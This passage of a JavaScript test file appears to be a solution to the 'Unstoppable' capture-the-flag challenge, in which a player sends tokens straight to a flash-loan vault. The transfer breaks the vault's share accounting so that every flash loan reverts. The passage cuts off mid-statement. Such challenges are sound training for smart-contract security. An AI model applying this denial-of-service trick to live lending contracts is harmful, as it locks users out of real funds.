...
describe("[Challenge] Unstoppable", function () {
  ...
  it("Execution", async function () {
    // We transfer DVT tokens directly to the Vault to the balance 1 DVT = 1 oDVT is broken and reverts in every flash loan
    await token
      .connect(player)
      .transfer(vault.address, INITIAL_PLAYER_TOKEN_BALANCE);
    const vaultBalance = await token.balanceOf(vault.address);
    const vaultShares = await vault.convertToShares(vaultBalance);
    const totalSupply = await vault.totalSupply();

    console.log(
      `Vault DVT balance ${ethers.utils.formatEther(vaultBalance.toString())}`
    );
    console.log(
      `oDVT total Supply ${ethers.utils.formatEther(totalSupply.toString())}`
    );
    console.log(
      `Vault assumes it has: ${ethers.utils.formatEther(
